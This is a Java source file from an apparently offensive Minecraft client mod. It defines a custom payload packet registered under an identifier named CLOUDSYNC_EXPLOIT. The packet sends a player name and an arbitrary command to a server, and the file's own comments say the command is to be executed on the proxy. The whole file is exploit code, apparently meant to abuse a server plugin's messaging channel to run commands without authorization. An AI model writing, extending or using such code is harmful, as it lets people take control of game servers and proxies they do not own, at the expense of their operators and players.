package dev.wrrulosdev.mcpclient.client.payloads;

import com.google.common.io.ByteArrayDataOutput;
import com.google.common.io.ByteStreams;
import dev.wrrulosdev.mcpclient.client.constants.IdentifierConstants;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.Objects;

public record CloudSyncPayloadPacket(String username, String command) implements CustomPayload {

    public static final PacketCodec<PacketByteBuf, CloudSyncPayloadPacket> CODEC = CustomPayload.codecOf(CloudSyncPayloadPacket::write, CloudSyncPayloadPacket::new);
    public static final Id<CloudSyncPayloadPacket> ID = new Id<>(IdentifierConstants.CLOUDSYNC_EXPLOIT);

    /**
     * Private constructor used for deserialization of the packet from a byte buffer.
     *
     * @param buf The buffer containing the serialized packet data.
     */
    private CloudSyncPayloadPacket(PacketByteBuf buf) {
        this(buf.readString(), buf.readString());
    }

    /**
     * Sends the cloudsync payload packet to the server.
     *
     * @param playerName The unique identifier for the user or session.
     * @param command The command to be executed in the proxy.
     */
    public static void send(String playerName, String command) {
        Objects.requireNonNull(MinecraftClient.getInstance().getNetworkHandler())
            .sendPacket(new CustomPayloadC2SPacket(new CloudSyncPayloadPacket(playerName, command)));
    }

    /**
     * Serializes the packet data into the provided byte buffer.
     *
     * @param buf The buffer to which the packet data will be written.
     */
    public void write(PacketByteBuf buf) {
        ByteArrayDataOutput out = ByteStreams.newDataOutput();
        out.writeUTF(username);
        out.writeUTF(command);
        buf.writeBytes(out.toByteArray());
    }

    /**
     * Retrieves the ID of this custom payload packet.
     *
     * @return The ID representing this custom payload packet.
     */
    public Id<CloudSyncPayloadPacket> getId() {
        return ID;
    }
}
